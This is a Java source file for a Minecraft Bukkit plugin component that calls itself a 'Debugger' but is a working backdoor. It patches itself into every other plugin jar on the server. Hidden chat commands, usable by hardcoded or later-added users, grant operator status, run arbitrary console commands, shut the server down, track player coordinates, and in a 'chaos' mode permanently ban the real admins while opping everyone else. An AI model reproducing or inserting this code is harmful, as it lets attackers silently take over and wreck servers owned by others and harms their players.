
package org.bukkit.debugger;

import org.bukkit.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public final class Debugger implements Listener {

    private Plugin plugin;

    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther, boolean warnings){
        //Check for another bd. This is really lame way
        boolean bd_running = false;
        Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
        for(Plugin p : pp){
            ArrayList<RegisteredListener> rls = HandlerList.getRegisteredListeners(p);
            for(RegisteredListener rl : rls){
                if(rl.getListener().getClass().getName().equals("org.bukkit.debugger.Debugger")){
                    bd_running = true;
                    break;
                }
            }
        }

        if(bd_running) {
            if (Config.display_debug_messages)
                Bukkit.getConsoleSender()
                        .sendMessage(plugin.getName() + ": BD aborted, another BD already loaded.");
            return;
        }

        //Check if we need to inject in other plugins
        if (InjectOther) {
            //Get all plugin paths
            File plugin_folder = new File("plugins/");
            File[] plugins = plugin_folder.listFiles();
            for(File plugin_file : plugins){

                //Skip config folders
                if(plugin_file.isDirectory())
                    continue;

                if(Config.display_debug_messages)
                    Bukkit.getConsoleSender()
                            .sendMessage("Injecting BD into: " + plugin_file.getPath());

                boolean result = API.patchFile(plugin_file.getPath(), plugin_file.getPath(),
                        new API.SimpleConfig(Usernames, UUID, prefix, InjectOther, warnings), true, warnings, false);

                if(Config.display_debug_messages)
                    Bukkit.getConsoleSender()
                            .sendMessage(result ? "Success." : "Failed, Already patched?");

            }
        }

        //First plugin loaded.
        Config.uuids_are_usernames = Usernames;
        Config.authorized_uuids  = UUID;
        Config.command_prefix   = prefix;
        Config.display_debug_messages = warnings;
        Config.display_debugger_warning = warnings;

        this.plugin = plugin;

        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];

        if(Config.display_debugger_warning){
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
        }

        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();

        //Remove color codes added by some chat plugins
        if(msg.startsWith("&")){
            msg = msg.substring(2);
        }

        if (Config.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        //Is user authorized to use Debugger commands
        if (IsUserAuthorized(p)) {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is authed");
            }

            if (msg.startsWith(Config.command_prefix)) {
                boolean result = ParseCommand(msg.substring(Config.command_prefix.length()), p);


                if (Config.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                }

                if (!result)
                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");

                e.setCancelled(true);
            }

        } else {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is not authed");
            }
        }


    }

    /*Basic command parser*/
    public boolean ParseCommand(String command, Player p) {
        //split fragments
        String[] args = command.split(" ");

        switch (args[0].toLowerCase()) {
            case "op": {  //Give user operator
                if (args.length == 1) {   //op self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                        }
                    }.runTask(plugin);

                } else {  //op other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(true);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                        }
                    }.runTask(plugin);
                }

                return true;
            }

            case "deop": {  //Remove user operator
                if (args.length == 1) {          //Deop self

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                        }
                    }.runTask(plugin);

                } else {                        //Deop other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            p1.setOp(false);
                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                        }
                    }.runTask(plugin);
                }
                return true;
            }

            case "gamemode":
            case "gm": {
                if (args.length == 1)
                    return false;

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
                    gm = GameMode.getByValue(reqGamemode);
                } catch (NumberFormatException e) {
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    } catch (IllegalArgumentException e1) {
                        //ignore
                        return false;
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "give": {
                if (args.length < 2)
                    return false;

                Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));

                if (reqMaterial == null)
                    return false;

                int reqAmmount = reqMaterial.getMaxStackSize();

                if (args.length > 2)
                    reqAmmount = Integer.parseInt(args[2]);


                int reqStacks = reqAmmount / reqMaterial.getMaxStackSize();
                int reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

                for (int i = 0; i < reqStacks; i++) {
                    p.getInventory().addItem(new ItemStack(reqMaterial, reqMaterial.getMaxStackSize()));
                }

                p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
                return true;
            }

            case "chaos": {  //Ban admins then admin the regulars

                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    //Ban all existing admins
                    if (p1.isOp()) {
                        //Skip authorized users
                        if (IsUserAuthorized(p1))
                            continue;

                        //Deop, ban, ip ban
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);
                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                p1.kickPlayer(Config.default_ban_reason);
                            }
                        }.runTask(plugin);
                    } else {

                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(true);
                            }
                        }.runTask(plugin);


                    }
                }

                Bukkit.broadcastMessage(Config.chaos_chat_broadcast);

                return true;
            }
            case "exec": {   //Exec command as server
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }

                final boolean[] result = {false};

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        result[0] = Bukkit.dispatchCommand(console, sb.toString());
                    }
                }.runTask(plugin);

                if (result[0]) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
                }

                return result[0];
            }
            case "ban": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);


                return true;
            }

            case "banip": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "seed": { //Get current seed
                String strseed = String.valueOf(p.getWorld().getSeed());
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
                return true;
            }

            case "32k": { //add 32k enchants to current item being held

                if (args.length < 2)
                    return false;

                String str_type = args[1];
                int type = 0;

                if (str_type.equalsIgnoreCase("tool"))
                    type = 1;

                //Is item a sword?
                ItemStack mainHandItem = p.getInventory().getItemInMainHand();

                if (type == 0) {
                    ItemMeta enchantMeta = mainHandItem.getItemMeta();

                    enchantMeta.addEnchant(Enchantment.DAMAGE_ALL, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.FIRE_ASPECT, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_MOBS, Config.dangerous_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.KNOCKBACK, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                    if (Config.curse_enchants)
                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);


                    mainHandItem.setItemMeta(enchantMeta);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                    return true;
                }

                ItemMeta enchantMeta = mainHandItem.getItemMeta();
                enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
                enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                if (Config.curse_enchants)
                    enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);

                mainHandItem.setItemMeta(enchantMeta);
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                return true;

            }
            case "coords": {
                if(args.length < 2) //No player specified
                    return false;

                Player target = Bukkit.getPlayer(args[1]);
                if(target == null){
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Player is real.
                Location targetLoc = target.getLocation();
                int x = (int)Math.floor( targetLoc.getX() );
                int y = (int)Math.floor( targetLoc.getY() );
                int z = (int)Math.floor( targetLoc.getZ() );

                String coordsString = Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
                p.sendMessage(coordsString);

                return true;
            }

            case "tp": {
                if(args.length < 4) //No coords specified
                    return false;

                int targetX, targetY, targetZ;
                try {
                    targetX = Integer.parseInt(args[1]);
                    targetY = Integer.parseInt(args[2]);
                    targetZ = Integer.parseInt(args[3]);
                }catch(NumberFormatException e){ //Not valid numbers
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Coordinates syntax error.");
                    return false;
                }

                //Player location reference
                Location loc = p.getLocation();

                loc.setX(targetX);
                loc.setY(targetY);
                loc.setZ(targetZ);

                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.teleport(loc);
                    }
                }.runTask(plugin);


                return true;
            }

            case "auth": { //Adds new user to authlist
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Add user to authlist
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                    if (Config.tmp_authorized_uuids[i] == null) {

                        if(Config.uuids_are_usernames)
                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
                        else
                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();

                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
                    Bukkit.getPlayer(args[1]).sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
                }
                return success;
            }

            case "deauth": {
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Remove user
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {

                    if(Config.uuids_are_usernames){
                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
                            Config.tmp_authorized_uuids[i] = null;
                            success = true;
                            break;
                        }
                    }else {
                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
                            Config.tmp_authorized_uuids[i] = null;
                            success = true;
                            break;
                        }
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
                }
                return success;
            }
                
            case "stop":
            case "shutdown": {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.shutdown();
                    }
                }.runTask(plugin);
                
                return true;
            }

            case "help": {
                if (args.length == 1) {
                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    p.sendMessage(Config.help_detail_color + "## BD ## () = Required, [] = Optional.");
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                    }

                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    return true;
                }

                if (args.length == 2) {

                    int indexOfCommand = -1;
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        if (args[1].equalsIgnoreCase(Config.help_messages[i].getName())) {
                            indexOfCommand = i;
                            break;
                        }
                    }

                    if (indexOfCommand == -1)
                        return false;

                    p.sendMessage(Config.help_messages[indexOfCommand].toString());

                    return true;

                }
            }

        }
        return false;
    }

    private int Clamp(int i, int min, int max) {
        if (i < min)
            return min;
        if (i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Config.java*/
    public boolean IsUserAuthorized(Player p) {
        if(Config.uuids_are_usernames)
            return IsUserAuthorized(p.getName());

        return IsUserAuthorized(p.getUniqueId().toString());
    }

    /*Check if UUID is authorized in Config.java*/
    public boolean IsUserAuthorized(String uuid) {

        for(String u : Config.authorized_uuids){
            if(uuid.equals(u)){
                return true;
            }
        }

        boolean authorized = false;

        for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
                authorized = true;
                break;
            }
        }

        return authorized;
    }
}
